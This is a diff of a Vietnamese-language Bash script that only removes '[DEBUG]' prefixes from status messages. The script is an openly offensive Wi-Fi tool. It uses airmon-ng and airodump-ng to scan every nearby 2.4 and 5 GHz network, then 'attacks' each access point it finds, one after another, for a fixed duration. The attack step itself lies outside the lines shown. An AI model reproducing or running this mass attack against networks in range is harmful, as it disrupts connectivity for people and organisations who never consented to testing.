@@ -9,16 +9,16 @@ CSV_FILE="/tmp/scan-01.csv"
 
 # Hàm dọn dẹ
 cleanup() {
-    echo "[DEBUG] Dừng tất cả tiến trình và khôi phục hệ thống..."
+    echo "Dừng tất cả tiến trình và khôi phục hệ thống..."
     for pid in $pids; do
         kill -9 "$pid" 2>/dev/null
     done
     sleep 1
-    echo "[DEBUG] Tắt monitor mode cho $MONITOR_INTERFACE..."
+    echo "Tắt monitor mode cho $MONITOR_INTERFACE..."
     airmon-ng stop "$MONITOR_INTERFACE"
-    echo "[DEBUG] Khởi động lại NetworkManager..."
+    echo "Khởi động lại NetworkManager..."
     service NetworkManager restart
-    echo "[DEBUG] Xóa file tạm..."
+    echo "Xóa file tạm..."
     rm -f /tmp/scan-01.*
     echo "Hoàn tất!"
     exit 0
@@ -33,11 +33,11 @@ if [[ $EUID -ne 0 ]]; then
 fi
 
 # Dừng các tiến trình xung đột
-echo "[DEBUG] Dừng các tiến trình xung đột..."
+echo "Dừng các tiến trình xung đột..."
 airmon-ng check kill
 
 # Chuyển sang monitor mode
-echo "[DEBUG] Chuyển $INTERFACE sang monitor mode..."
+echo "Chuyển $INTERFACE sang monitor mode..."
 airmon-ng start "$INTERFACE"
 if ! iwconfig 2>&1 | grep -q "$MONITOR_INTERFACE"; then
     echo "[ERROR] Không thể chuyển sang monitor mode. Kiểm tra card mạng."
@@ -45,17 +45,17 @@ if ! iwconfig 2>&1 | grep -q "$MONITOR_INTERFACE"; then
 fi
 
 # Quét mạng Wi-Fi
-echo "[DEBUG] Quét mạng Wi-Fi trong $SCAN_TIME giây (bao gồm 2.4 GHz và 5 GHz)..."
+echo "Quét mạng Wi-Fi trong $SCAN_TIME giây (bao gồm 2.4 GHz và 5 GHz)..."
 timeout "$SCAN_TIME" airodump-ng "$MONITOR_INTERFACE" --band abg -w /tmp/scan --output-format csv &
 wait $!
-echo "[DEBUG] Quét hoàn tất."
+echo "Quét hoàn tất."
 
 # Kiểm tra file CSV
 if [[ ! -f "$CSV_FILE" ]]; then
     echo "[ERROR] Không tìm thấy file $CSV_FILE. Quét thất bại."
     cleanup
 fi
-echo "[DEBUG] File CSV: $CSV_FILE đã được tạo."
+echo "File CSV: $CSV_FILE đã được tạo."
 
 # Lọc và đếm số AP
 ap_count=$(grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | wc -l)
@@ -63,10 +63,10 @@ if [[ $ap_count -eq 0 ]]; then
     echo "[ERROR] File $CSV_FILE không chứa dữ liệu AP."
     cleanup
 fi
-echo "[DEBUG] Tìm thấy $ap_count mạng Wi-Fi."
+echo "Tìm thấy $ap_count mạng Wi-Fi."
 
 # Đọc danh sách AP và tấn công tuần tự
-echo "[DEBUG] Bắt đầu tấn công tất cả mạng Wi-Fi... (Nhấn 'q' để dừng)"
+echo "Bắt đầu tấn công tất cả mạng Wi-Fi... (Nhấn 'q' để dừng)"
 pids=""
 grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1 time2 channel speed privacy cipher auth power beacons iv lan idlength essid key; do
     bssid=$(echo "$bssid" | tr -d ' ')
@@ -86,7 +86,7 @@ grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1
         essid="(Hidden SSID)"
     fi
 
-    echo "[DEBUG] Tấn công \"$essid\" (BSSID: $bssid, Channel: $channel)"
+    echo "Tấn công \"$essid\" (BSSID: $bssid, Channel: $channel)"
     # Chuyển kênh bằng iw trên giao diện monitor
     iw dev "$MONITOR_INTERFACE" set channel "$channel" || {
         echo "[ERROR] Không thể chuyển sang kênh $channel cho $bssid (có thể driver không hỗ trợ)"
@@ -104,15 +104,15 @@ grep -v "Station MAC" "$CSV_FILE" | tail -n +2 | while IFS=, read -r bssid time1
 done
 
 # Chờ và dừng sau 100 giây hoặc khi nhấn 'q'
-echo "[DEBUG] Đang tấn công trong $DURATION giây... (Nhấn 'q' để dừng sớm)"
+echo "Đang tấn công trong $DURATION giây... (Nhấn 'q' để dừng sớm)"
 for ((i=0; i<$DURATION; i++)); do
     read -t 1 -n 1 key
     if [[ "$key" == "q" ]]; then
-        echo "[DEBUG] Người dùng yêu cầu dừng sớm."
+        echo "Người dùng yêu cầu dừng sớm."
         cleanup
     fi
 done
 
 # Dừng tấn công sau 100 giây
-echo "[DEBUG] Thời gian tấn công kết thúc."
+echo "Thời gian tấn công kết thúc."
 cleanup
